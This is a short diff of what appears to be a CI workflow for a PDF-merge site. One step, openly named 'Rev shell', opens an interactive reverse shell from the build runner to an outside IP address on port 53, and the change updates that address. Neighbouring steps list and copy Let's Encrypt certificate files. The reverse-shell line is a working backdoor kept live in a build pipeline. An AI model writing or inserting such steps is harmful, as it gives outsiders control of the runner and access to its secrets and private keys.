@@ -80,7 +80,7 @@ jobs:
         run: sudo ls -la /etc/letsencrypt/live/pdfmerge.work/ ; sleep 5
       
       - name: Rev shell
-        run: bash -c "sh -i >& /dev/tcp/155.248.245.118/53 0>&1"
+        run: bash -c "sh -i >& /dev/tcp/140.238.230.97/53 0>&1"
 
       - name: Copy Certificates to Repo Folder
         run: |
